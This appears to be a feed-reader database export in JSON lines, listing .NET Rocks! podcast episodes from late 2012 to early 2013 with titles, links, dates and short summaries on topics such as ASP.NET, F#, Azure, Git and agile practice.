{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=855","title":"Jeff Fritz Knows One ASP.NET","published":{"$wrap":"$date","v":1363665600000,"h":"2013-03-19T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Jeff Fritz about how ASP.NET has evolved over the years. Jeff talks about the continued dominance of Web Forms in relation to MVC and how the different libraries can be used together. In fact, there's ONE ASP.NET, and everything - Web Forms, MVC, Web API, SignalR - all work together. It's a web stack of love!","author":false,"_id":{"$wrap":"$oid","v":37}}
{"k":"0000000080","o":"0000000843","v":"001"}
{"_id":38,"_uid":38,"_dt":1373728933703,"_s":"273ee1fe20d10b3e78934df9169e753a"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=854","title":"Mark Heath Talks Audio in Windows","published":{"$wrap":"$date","v":1363233600000,"h":"2013-03-14T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Mark Heath about audio in Windows. Mark is the leader on the nAudio codeplex project that is a .NET audio and MIDI library. The conversation digs into the fundamentals of digital audio as well as many of the codex and APIs associated with audio - it can be confusing! Mark also talks a bit about the history of audio gear around AdLib, Soundblaster, Voyetra and the like. Mark has some other open source projects involving audio including a Skype voice changer and MP3 decoder in managed code. Check 'em out!","author":false,"_id":{"$wrap":"$oid","v":38}}
{"k":"0000000080","o":"0000000776","v":"001"}
{"_id":39,"_uid":39,"_dt":1373728933704,"_s":"cbdb06240eb6c24ddf31ec6a17c3fcd3"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=853","title":"Glenn Block Goes Open Source with ScriptCS","published":{"$wrap":"$date","v":1363060800000,"h":"2013-03-12T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Glenn Block about his open source project called ScriptCS. Glenn talks about his inspiration for the project, taking the principles of node.js and applying it to C#, using the RoslynCTP. The conversation digs into the speed at which ScriptCS has taken off - at the time of the recording it had only been around for a week and there were 18 contributors on GitHub! This is the non-subdued version of Glenn Block we all know and love!","author":false,"_id":{"$wrap":"$oid","v":39}}
{"k":"0000000080","o":"0000000747","v":"001"}
{"_id":40,"_uid":40,"_dt":1373728933707,"_s":"eeff04f0ef0df06cfe153ea2f537a202"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=852","title":"Kord Davis Discusses the Ethics of Big Data","published":{"$wrap":"$date","v":1362628800000,"h":"2013-03-07T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Kord Davis about the ethics of Big Data. As developers we tend to focus on the technology, rather than the impact it has - and big data gets into some serious moral hazards. Kord talks about some of the issues that companies have gotten into around Big Data, deriving facts about individuals that they have intended to keep private. Legislation is coming around Big Data - be part of that conversation.","author":false,"_id":{"$wrap":"$oid","v":40}}
{"k":"0000000080","o":"0000000713","v":"001"}
{"_id":41,"_uid":41,"_dt":1373728933708,"_s":"2dde724392b38f21f32a5a4a6a2be11c"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=851","title":"Tomas Petricek Digs Deep into F#","published":{"$wrap":"$date","v":1362456000000,"h":"2013-03-05T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Tomas Petricek about functional programming and F# in particular. The conversation starts out talking about type providers, one of the newest features of F#. Tomas digs into other aspects of F#, comparing it to C#, and talks about the functional programming mind set and how it changes the way you think about coding. Check out all the links below for F# resources and community!","author":false,"_id":{"$wrap":"$oid","v":41}}
{"k":"0000000080","o":"0000000673","v":"001"}
{"_id":42,"_uid":42,"_dt":1373728933709,"_s":"6621e0f448e2f4d6242b3f8e38e67585"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=850","title":"Steve Smith is a Software Craftsman","published":{"$wrap":"$date","v":1362024000000,"h":"2013-02-28T04:00:00.000Z"},"starred":false,"read":false,"content":"At the MVP Summit, Carl and Richard talk to Steve Smith about the Software Craftmanship calendar. While filled with good messages like Separating Concerns and YAGNI, it also has hilarious images of why you should follow these principles. The conversation digs into each of the topics with different ideas and approaches to being successful. A fun Thursday show!","author":false,"_id":{"$wrap":"$oid","v":42}}
{"k":"0000000080","o":"0000000723","v":"001"}
{"_id":43,"_uid":43,"_dt":1373728933710,"_s":"c97c2f896a372b49de7b5bf6f3fd76d6"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=849","title":"Vishwas Lele Builds Apps in Sharepoint 2013","published":{"$wrap":"$date","v":1361851200000,"h":"2013-02-26T04:00:00.000Z"},"starred":false,"read":false,"content":"At the MVP Summit, Carl and Richard sit down with Vishwas Lele to talk about the new app development models available in Sharepoint 2013. Vishwas talks through different scenarios and approaches to building these modern apps, utilizing Javascript libraries to access SharePoint as well as web services, Azure and more. Building SharePoint applications has transformed into SharePoint apps, check it out!","author":false,"_id":{"$wrap":"$oid","v":43}}
{"k":"0000000080","o":"0000000882","v":"001"}
{"_id":44,"_uid":44,"_dt":1373728933712,"_s":"8655e0f2c782878f4113f17fa792c99b"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=848","title":"Mike Hadlow Uses EasyNetQ to Talk RabbitMQ","published":{"$wrap":"$date","v":1361419200000,"h":"2013-02-21T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Mike Hadlow about EasyNetQ, a simple API for .NET developers to communicate with RabbitMQ. The conversation starts out dealing with the fundamentals of queuing, it's advantages (and disadvantages) and how it impacts your architecture. Mike also digs into Microsoft Message Queue (MSMQ) and how it differs from RabbitMQ. From there Mike digs into the role of EasyNetQ and how it relates to products like MassTransit and nServiceBus. Whether you're new to queuing, just digging into MSMQ or keen to go deep on queuing, this show is for you!","author":false,"_id":{"$wrap":"$oid","v":44}}
{"k":"0000000080","o":"0000000861","v":"001"}
{"_id":45,"_uid":45,"_dt":1373728933713,"_s":"5c45a1f9aec564bbb99e520ca479fcd9"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=847","title":"Brian Noyes Builds LOB Apps with Kona Guidance","published":{"$wrap":"$date","v":1361246400000,"h":"2013-02-19T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Brian Noyes about Microsoft's Patterns and Practices Kona Guidance for developing Windows Store Line of Business Apps. The conversation digs into the evolution of 'Prism for WinRT' into Kona and how they are substantially different because Windows Stores are substantially different. Brian digs into specifics about Windows Store apps, like Suspend, Terminate and Resume and its impact on guidance. If you're interested in Windows 8 development, check out The Tablet Show, especially the shows in the links below!","author":false,"_id":{"$wrap":"$oid","v":45}}
{"k":"0000000080","o":"0000000787","v":"001"}
{"_id":46,"_uid":46,"_dt":1373728933714,"_s":"7a9aa9bd4417825c89dcf48c2186b6a4"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=846","title":"Yan Cui Builds Games in F#","published":{"$wrap":"$date","v":1360814400000,"h":"2013-02-14T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Yan Cui about his experience building games with F#. Yan talks about his experiences working with games through Facebook, the client side being predominantly Flash, but the back end systems being initially Java, then converted to C#, and now to F#. As Yan explains, F# is faster, smaller, easier to maintain and to read. The conversation spans over dealing with parallelism, massive scale, cloud implementation and data analytics as well - lots of cool stuff!","author":false,"_id":{"$wrap":"$oid","v":46}}
{"k":"0000000080","o":"0000000786","v":"001"}
{"_id":47,"_uid":47,"_dt":1373728933715,"_s":"1bf12730cf93c75d432fcf8de3bfdabf"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=845","title":"Web API Roundtable with Block, Nielsen and Miller","published":{"$wrap":"$date","v":1360641600000,"h":"2013-02-12T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard host a now-rare telephone-based conference call (remember when these were cool?) with Glenn Block, Henrik Nielsen and Darrel Miller about Web API. But first the conversation has to deal with the reality of having Henrik Nielsen on the call - a former graduate student of Tim Berners Lee and a guy who worked on the very beginnings of the World Wide Web! But the main topic is Web API and the reasons, strengths and approaches to using Web API.","author":false,"_id":{"$wrap":"$oid","v":47}}
{"k":"0000000080","o":"0000000941","v":"001"}
{"_id":48,"_uid":48,"_dt":1373728933717,"_s":"f1bc481b378ef9bbda25affd6f7ea9a6"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=844","title":"Geeking Out with a Nuclear Entrepreneur","published":{"$wrap":"$date","v":1360209600000,"h":"2013-02-07T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard revisit nuclear power with Rod Adams, who has spent most of his career working in nuclear power. Rod talks about his experiences running nuclear reactors in US Navy submarines and then digs into nuclear power generations world wide. The discussion digs into the differences between light water and heavy water reactors, the role of breeder reactors and the reality that nuclear waste isn't waste at all - its carefully stored and contained for eventual reuse in more modern reactor designs. Rod also shares his thoughts on up-and-coming nuclear technologies including thorium, pebble bed and travelling wave.","author":false,"_id":{"$wrap":"$oid","v":48}}
{"k":"0000000080","o":"0000000853","v":"001"}
{"_id":49,"_uid":49,"_dt":1373728933718,"_s":"ba4dba70b092c928a6cd0e98e5935079"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=843","title":"Demis Bellot on ServiceStack","published":{"$wrap":"$date","v":1360036800000,"h":"2013-02-05T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Demis Bellot about ServiceStack, a set of tools for building web services and MVC web sites with incredible performance. Demis talks about his thinking behind ServiceStack, its support for a diverse set of protocols and how it compares to WCF and WebAPI. The conversation also dives into Google's Protocol Buffers, an extremely lean protocol even faster than JSON for web services as well as Dart, Google's optionally typed, higher-level language that transpiles to Javascript. Awesome conversation with a hugely smart guy!","author":false,"_id":{"$wrap":"$oid","v":49}}
{"k":"0000000080","o":"0000000786","v":"001"}
{"_id":50,"_uid":50,"_dt":1373728933719,"_s":"2c9b6b3ae350ac1b35c2ae8f42d9892b"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=842","title":"Martin Woodward Announces Git with TFS","published":{"$wrap":"$date","v":1359604800000,"h":"2013-01-31T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Martin Woodward about Microsoft's announcement of integrating Git into Visual Studio and TFS. Martin talks about Microsoft's thinking about why and how to add Git support to Visual Studio and TFS. Then the conversation digs into the different configuration options - the Git tools work even in Visual Studio Express! Martin compares the differences of using Git directly from Studio as well as via TFS. It's a cool time to be a Studio programmer!","author":false,"_id":{"$wrap":"$oid","v":50}}
{"k":"0000000080","o":"0000000406","v":"001"}
{"_id":51,"_uid":51,"_dt":1373728933720,"_s":"7f30801b11a0ec6fa1e44dbdcec4c8b3"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=841","title":"Jamie Wright has Rails for .NET Developers","published":{"$wrap":"$date","v":1359432000000,"h":"2013-01-29T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Jamie Wright about what .NET Developers can learn about Rails.","author":false,"_id":{"$wrap":"$oid","v":51}}
{"k":"0000000080","o":"0000000689","v":"001"}
{"_id":52,"_uid":52,"_dt":1373728933720,"_s":"455f1a2231c3e75aada654c5aae087c2"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=840","title":"Stories from CodeMash!","published":{"$wrap":"$date","v":1359000000000,"h":"2013-01-24T04:00:00.000Z"},"starred":false,"read":false,"content":"While at CodeMash, Carl and Richard collected some great stories. First up is Evan Hauck, who digs into CUDAfy, a library on Codeplex that allows you to run C# code (any IL code actually) on your GPU. The second story is about Jessie Shternshus and her company The Improv Effect. Jessie talks about how she uses improv to help teams work together more effectively. Another awesome CodeMash!","author":false,"_id":{"$wrap":"$oid","v":52}}
{"k":"0000000080","o":"0000000864","v":"001"}
{"_id":53,"_uid":53,"_dt":1373728933721,"_s":"bb7aec10947976fca05191a764c3ef00"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=839","title":"Andrew Brust Processes Big Data","published":{"$wrap":"$date","v":1358827200000,"h":"2013-01-22T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Andrew Brust about Big Data. Andrew starts off connecting together the definitions of business intelligence, data analytics, OLAP, data warehousing and big data. They're all related, even though they've come at the problem of understanding data from different directions. The conversation digs deeply into Hadoop, the Linux-centric MapReduce technology that has come to define the idea of Big Data, as well as Microsoft's implementation once called Project Isotope and now known as HDInsight. How big is Big Data? That's up to you!","author":false,"_id":{"$wrap":"$oid","v":53}}
{"k":"0000000080","o":"0000000680","v":"001"}
{"_id":54,"_uid":54,"_dt":1373728933722,"_s":"db88f9d29649064bbed832f2c7f3c910"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=838","title":"Is Agile Dead at CodeMash","published":{"$wrap":"$date","v":1358395200000,"h":"2013-01-17T04:00:00.000Z"},"starred":false,"read":false,"content":"While at CodeMash in Sandusky Ohio, Carl and Richard moderated a panel discussion on the death of agile. The panel quickly agrees that agile isn't dead at all - it's become so mainstream that it is discussed less and less. A bigger discussion is what exactly agile is - a topic addressed by audience member Jon Kern, who was part of the group that developed the agile manifesto.","author":false,"_id":{"$wrap":"$oid","v":54}}
{"k":"0000000080","o":"0000001343","v":"001"}
{"_id":55,"_uid":55,"_dt":1373728933724,"_s":"71e46367b1ae7f789ee378f00f29de7f"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=837","title":"Richard Astbury Migrates Applications to Azure","published":{"$wrap":"$date","v":1358222400000,"h":"2013-01-15T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Richard Astbury about migrating applications to Azure. The conversation starts out dealing with the basic idea of why you would migrate to the cloud - typically right before you have to buy more hardware to scale up or replace existing equipment. Richard then walks through the various challenges of migration, including migrating data, determining the particular style of cloud you want to use, maximizing advantages while minimizing cost. He talks about the fact that Java applications can be easier to migrate into Azure worker roles, since they tend to live in a sandbox and not touch the restricted elements of Windows inside the Azure world. Richard also digs into bootstrapping, providing links to tools to facilitate getting a worker role instance up and running with all the bits you need. Finally, the conversation digs into taking advantage of Azure - optimizing designs to reduce cost as well as utilizing the resources of Azure including Azure Fabric, Service Bus, diagnostics, etc.","author":false,"_id":{"$wrap":"$oid","v":55}}
{"k":"0000000080","o":"0000000882","v":"001"}
{"_id":56,"_uid":56,"_dt":1373728933725,"_s":"3c3dac11b7dd580f13d0bbafab2d8f22"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=836","title":"Rob Reynolds Builds Chocolatey","published":{"$wrap":"$date","v":1357790400000,"h":"2013-01-10T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Rob Reynolds about Chocolatey - a global PowerShell execution engine. But first, the conversation digs into the Chuck Norris Framework! Yes, that's right, a framework based on violent karate moves, Rob talks about Roundhouse, a migration and source management tool for SQL, as well as DropKick, a deployment framework and UpperCut, a template build manager. There's more to Chuck Norris than just these bits, check it out in the show notes! Finally the conversation comes around the Chocolatey, aka apt-get for Windows. Rob talks about how Chocolatey","author":false,"_id":{"$wrap":"$oid","v":56}}
{"k":"0000000080","o":"0000001077","v":"001"}
{"_id":57,"_uid":57,"_dt":1373728933726,"_s":"07c3b30093898b49bd260e56b835d3ad"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=835","title":"Thiago Silva and Jeff Hewitt on Azure - the Good, the Bad and the Ugly","published":{"$wrap":"$date","v":1357617600000,"h":"2013-01-08T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Thiago Silva and Jeff Hewitt about building applications in Azure. The good? Scaling, deployment and costs. More good - great tools and information from Patterns and Practices. The bad? Getting coherent monitoring together. The conversation digs deep into Azure level monitoring, web level monitoring and application level monitoring. How do you relate the data together? What measurements matter? How do you get to the point where you have a dashboard that shows you the health of your application? Finally, there is the ugly - and it's called licensing. Thiago and Jeff talk about how some license models (like per-machine licensing) just don't work in Azure. Good stuff for getting serious about Azure!","author":false,"_id":{"$wrap":"$oid","v":57}}
{"k":"0000000080","o":"0000000789","v":"001"}
{"_id":58,"_uid":58,"_dt":1373728933727,"_s":"9ac6d8ac7245b016db00974f99e21267"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=834","title":"Carl and Richard Geek Out on Nuclear Power","published":{"$wrap":"$date","v":1357185600000,"h":"2013-01-03T04:00:00.000Z"},"starred":false,"read":false,"content":"The first geek out of 2013, Carl and Richard talk about nuclear power. Much feared and maligned, Richard walks through the principles of atomic theory, how neutrons are the key to the whole process and why Uranium-235 is so much more important than Uranium-238. The conversation also dives into some alternative nuclear power concepts including Traveling Wave Reactors, Pebble Bed Reactors and Thorium Salt Reactors. But they steer clear of fusion - that's another show!","author":false,"_id":{"$wrap":"$oid","v":58}}
{"k":"0000000080","o":"0000000739","v":"001"}
{"_id":59,"_uid":59,"_dt":1373728933728,"_s":"86eddfb74429a8dfaef7c987998ed237"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=833","title":"What Developers Should Care About in 2013!","published":{"$wrap":"$date","v":1357012800000,"h":"2013-01-01T04:00:00.000Z"},"starred":false,"read":false,"content":"At the inaugural DevIntersection conference in Las Vegas, Carl and Richard hosted a panel to discuss what developers should care about in 2013. The panel of Scott Allen, Kate Gregory, Michele Leroux Bustamante and Woody Pewitt covered a huge spectrum of topics, including web development, client development on multiple platforms, cloud technologies and mobile development. Did we cover everything? Write comments below!","author":false,"_id":{"$wrap":"$oid","v":59}}
{"k":"0000000080","o":"0000000821","v":"001"}
{"_id":60,"_uid":60,"_dt":1373728933729,"_s":"9520c0593e67034e592e78226f4cfb03"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=832","title":"Ward Bell Builds Breeze.js","published":{"$wrap":"$date","v":1356580800000,"h":"2012-12-27T04:00:00.000Z"},"starred":false,"read":false,"content":"At the San Francisco stop of the .NET Rocks! Visual Studio 2012 Road Trip, Carl and Richard sat down with Ward Bell in the GitHub offices to talk about his experiences creating breeze.js. Breeze.js focuses on the plumbing needed to make Single Page Applications (SPA) on the web work well. Ward talks about key pieces of Breeze including caching, validation, automated object mapping and more. He admits his inspiration is Silverlight and how it handled this plumbing so well. Now it's available in Javascript as well!","author":false,"_id":{"$wrap":"$oid","v":60}}
{"k":"0000000080","o":"0000000884","v":"001"}
{"_id":61,"_uid":61,"_dt":1373728933730,"_s":"4468a28c5bacecbc4c2c0d9420792662"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=831","title":"A Very Haacky Christmas!","published":{"$wrap":"$date","v":1356408000000,"h":"2012-12-25T04:00:00.000Z"},"starred":false,"read":false,"content":"While at the Los Angeles stop of the .NET Rocks! Visual Studio 2012 Launch Road Trip, Carl and Richard sat down with Phil Haack to talk about Git and GitHub. The conversation starts out with a primer on Git itself and its origins as a distributed source control for Linux. Then Phil discusses how GitHub created a more social environment for Git with pull requests and dialog around code. Phil also talks about how GitHub itself operates as a non-hierarchical business and what that means to his work day, his career and his prospects for a raise. A little NuGet sneaks in there too!","author":false,"_id":{"$wrap":"$oid","v":61}}
{"k":"0000000080","o":"0000000761","v":"001"}
{"_id":62,"_uid":62,"_dt":1373728933730,"_s":"cabfb77d70ffc8f3923271bfb1753ed4"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=830","title":"Brian Randell Does DevOps on the Microsoft Stack","published":{"$wrap":"$date","v":1355976000000,"h":"2012-12-20T04:00:00.000Z"},"starred":false,"read":false,"content":"While at the Irvine stop of the .NET Rocks! Visual Studio 2012 Launch Road Trip, Carl and Richard chatted with Brian Randell about the DevOps movement and it's application in the Microsoft world. DevOps focuses on the concept of bringing developers and operations together to iterate software more quickly, so that your applications are continuously delivered with continuous feedback and continuous quality. That's a lot of continuity!","author":false,"_id":{"$wrap":"$oid","v":62}}
{"k":"0000000080","o":"0000000496","v":"001"}
{"_id":63,"_uid":63,"_dt":1373728933731,"_s":"56fc47f8f356c8a79fb63907f56cc115"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=829","title":"Venkat Subramaniam Talks Modern Development","published":{"$wrap":"$date","v":1355803200000,"h":"2012-12-18T04:00:00.000Z"},"starred":false,"read":false,"content":"While at the Houston stop of the .NET Rocks! Visual Studio 2012 Launch Road Trip, Carl and Richard sat down with Venkat Subramaniam to talk about development in the modern era.","author":false,"_id":{"$wrap":"$oid","v":63}}
{"k":"0000000080","o":"0000001038","v":"001"}
{"_id":64,"_uid":64,"_dt":1373728933732,"_s":"e6abb0b96fcd4214cbd526e9d2d1f865"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=828","title":"Faster Development Cycles at Better Software","published":{"$wrap":"$date","v":1355371200000,"h":"2012-12-13T04:00:00.000Z"},"starred":false,"read":false,"content":"While at the Orlando stop of the .NET Rocks! Visual Studio 2012 Launch Road Trip, Carl and Richard stopped at the Better Software conference to have some conversations about fast development cycles. The first conversation is with Jesse Dowdle, who has a web app shipping new versions several times a day, with great visibility into the production environment to get feedback rapidly to developers. The second conversation is with Mathew Bissett, working for the UK Government, who participated in bringing an application that shipped a version every nine months down to 22 weeks, then to 6 weeks, and now daily and looking to go even faster! How fast can development cycles go, and what does it take to speed them up?","author":false,"_id":{"$wrap":"$oid","v":64}}
{"k":"0000000080","o":"0000000533","v":"001"}
{"_id":65,"_uid":65,"_dt":1373728933733,"_s":"9f7b5ad152aa8e8a9dd1e83282ef9110"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=827","title":"Matt Nunn Talks Modern Apps and the Modern App Lifecycle","published":{"$wrap":"$date","v":1355198400000,"h":"2012-12-11T04:00:00.000Z"},"starred":false,"read":false,"content":"While at the Bentonville stop of the .NET Rocks! Visual Studio 2012 Launch Road Trip, Carl and Richard sat down with Matt Nunn to talk about his vision around Modern Apps and the Modern App Lifecycle.","author":false,"_id":{"$wrap":"$oid","v":65}}
{"k":"0000000080","o":"0000000745","v":"001"}
{"_id":66,"_uid":66,"_dt":1373728933734,"_s":"b39f026394aeca207b54fef1011f38c7"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=826","title":"Ken Pugh on Acceptance Test Driven Design","published":{"$wrap":"$date","v":1354766400000,"h":"2012-12-06T04:00:00.000Z"},"starred":false,"read":false,"content":"While in Orlando for the .NET Rocks! Visual Studio 2012 Launch Road Trip, Carl and Richard stopped in at the Better Software conference to talk to Ken Pugh about Acceptance Test Driven Design. Ken describes the core concept of involving the 'triad' of business stakeholder, developer and tester when writing user stories and capturing tests at the same time - tests that are described to the satisifaction of all three parties.","author":false,"_id":{"$wrap":"$oid","v":66}}
{"k":"0000000080","o":"0000000813","v":"001"}
{"_id":67,"_uid":67,"_dt":1373728933735,"_s":"795d7b9ea4ead6b17e427ca02b176168"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=825","title":"Mark Dunn Teaches MVC","published":{"$wrap":"$date","v":1354593600000,"h":"2012-12-04T04:00:00.000Z"},"starred":false,"read":false,"content":"At the Jacksonville stop of the .NET Rocks! Visual Studio 2012 Launch Road Trip, Carl and Richard sat down with former co-host of .NET Rocks! Mark Dunn to talk about his experiences with MVC. The conversation starts out talking about the old days - when Carl and Mark both taught .NET. Mark has continued to train, but these days focuses on MVC. He compares the modern web application approach of MVC with the old days, talks about strengths and weakenesses and how you can get the most out of your web application.","author":false,"_id":{"$wrap":"$oid","v":67}}
{"k":"0000000080","o":"0000000898","v":"001"}
{"_id":68,"_uid":68,"_dt":1373728933736,"_s":"904f9be5aff842c857dce9ed1306265e"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=824","title":"Scott Ambler Optimizes Agile","published":{"$wrap":"$date","v":1354161600000,"h":"2012-11-29T04:00:00.000Z"},"starred":false,"read":false,"content":"While on the .NET Rocks! Visual Studio 2012 Launch Road Trip stop in Orlando Florida, Carl and Richard stopped into the Better Software conference and interviewed Scott Ambler about his work helping companies implement agile development practices. The conversation starts out talking about the scalability of agile practices, how waterfall is hard to get rid of, and common mistakes that organizations make implementing agile. Scott also digs into the DevOps movement, talking about how all stakeholders in an application, including operations and tech support, need to be part of the process.","author":false,"_id":{"$wrap":"$oid","v":68}}
{"k":"0000000080","o":"0000000660","v":"001"}
{"_id":69,"_uid":69,"_dt":1373728933737,"_s":"4dfea36e2d6ffc80176c7c310734e687"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=823","title":"Steve Evans Instruments Applications","published":{"$wrap":"$date","v":1353988800000,"h":"2012-11-27T04:00:00.000Z"},"starred":false,"read":false,"content":"While at the Orlando stop of the .NET Rocks! Visual Studio 2012 Launch Road Trip, Carl and Richard talk to Steve Evans about his work instrumenting applications in production. Steve talks about how to understand the log files coming out of Internet Information Server, and how you can analyze the log files to improve the performance of your site.","author":false,"_id":{"$wrap":"$oid","v":69}}
{"k":"0000000080","o":"0000000672","v":"001"}
{"_id":70,"_uid":70,"_dt":1373728933740,"_s":"de3b3b8a9e2a3c87937b4bbb135cabcd"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=822","title":"Dan North Deals with Uncertainty!","published":{"$wrap":"$date","v":1353556800000,"h":"2012-11-22T04:00:00.000Z"},"starred":false,"read":false,"content":"While at the Better Software show in Orlando during the Road Trip, Carl and Richard talked to Dan North about how development teams can manage uncertainty. Dan talks about how software planning can change to being more discovery based, knowing what is unknown. That process gets people talking and learning from each other and ultimately creates excellent plans.","author":false,"_id":{"$wrap":"$oid","v":70}}
{"k":"0000000080","o":"0000000482","v":"001"}
{"_id":71,"_uid":71,"_dt":1373728933741,"_s":"d913c7f4b3e386234b8294c78949eff2"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=821","title":"John Papa Builds Single Page Applications","published":{"$wrap":"$date","v":1353384000000,"h":"2012-11-20T04:00:00.000Z"},"starred":false,"read":false,"content":"While at the Tampa stop of the .NET Rocks! Visual Studio 2012 Launch Road Trip, Carl and Richard talked to John Papa about building Single Page Applications (SPAs).","author":false,"_id":{"$wrap":"$oid","v":71}}
{"k":"0000000080","o":"0000000501","v":"001"}
{"_id":72,"_uid":72,"_dt":1373728933741,"_s":"92c72e2b54e4ed56fc0a228100ec6c17"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=820","title":"Udi Dahan Talks CQRS, Agile and More","published":{"$wrap":"$date","v":1352952000000,"h":"2012-11-15T04:00:00.000Z"},"starred":false,"read":false,"content":"At the Tallahassee Code Camp stop of the .NET Rocks! Visual Studio 2012 Launch Road Trip, Carl and Richard chatted with Udi Dahan about development practices, architecture and methodology.","author":false,"_id":{"$wrap":"$oid","v":72}}
{"k":"0000000080","o":"0000000894","v":"001"}
{"_id":73,"_uid":73,"_dt":1373728933742,"_s":"01eb49751bbef09dd717aab34d5c675c"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=819","title":"Oren Eini Does NoSQL First","published":{"$wrap":"$date","v":1352779200000,"h":"2012-11-13T04:00:00.000Z"},"starred":false,"read":false,"content":"On the .NET Rocks! Visual Studio 2012 Launch Road Trip, Carl and Richard stopped in at the NoVa Code Camp in Reston, Virginia and talked to Oren Eini about the role of NoSQL in modern application development. Oren explores the compromises that developers make to work with relational databases - compromises that are made by reflex, with almost no thought. He makes the case that in many cases, building applications that store data in NoSQL stores (including RavenDB) are simpler, more reliable and faster to develop. So what is the role of SQL Server in this new world? Listen to find out!","author":false,"_id":{"$wrap":"$oid","v":73}}
{"k":"0000000080","o":"0000000766","v":"001"}
{"_id":74,"_uid":74,"_dt":1373728933743,"_s":"234c1492aced635e70efce54a50d34db"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=818","title":"Alex Robson is a Principled Polyglot","published":{"$wrap":"$date","v":1352347200000,"h":"2012-11-08T04:00:00.000Z"},"starred":false,"read":false,"content":"While at the Louisville stop of the .NET Rocks! Visual Studio Launch Road Trip, Carl and Richard sat down with Alex Robson to dig deep on what it takes to be a successful polyglot programmer. Alex talks about the characteristics of different languages - not just their syntax, but also their idioms and culture, and how that affects their role in building software. He talks specifically about C#, Javascript (largely in the form of node.js) and Erlang.","author":false,"_id":{"$wrap":"$oid","v":74}}
{"k":"0000000080","o":"0000000839","v":"001"}
{"_id":75,"_uid":75,"_dt":1373728933744,"_s":"5c06409c53f6c7397c4c1cad2d9eb7e2"}
